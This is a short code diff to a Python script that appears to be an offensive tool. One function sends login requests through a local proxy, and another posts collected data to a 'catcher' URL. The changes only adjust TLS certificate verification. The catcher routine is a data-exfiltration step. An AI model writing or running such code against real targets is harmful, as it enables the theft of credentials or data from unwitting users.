@@ -43,8 +43,7 @@ def send_login_request(username, password):
             proxies={"http": "http://changeme:changeme@127.0.0.1:1234", "https": "http://changeme:changeme@127.0.0.1:1234"},
             headers=post_headers,
             data=body_params,
-            timeout=5,
-            verify=False,
+            timeout=5
         )
         return response.status_code, response.text
 
@@ -55,7 +54,7 @@ def send_data_to_catcher(data, use_ssl):
     if not use_ssl:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     try:
-        response = requests.post(catcher_URL, json=data, timeout=3, verify=False)
+        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
         print("[+] Data sent to the catcher.")
     except requests.RequestException:
         print(f"[-] Failed to send data to the catcher.")
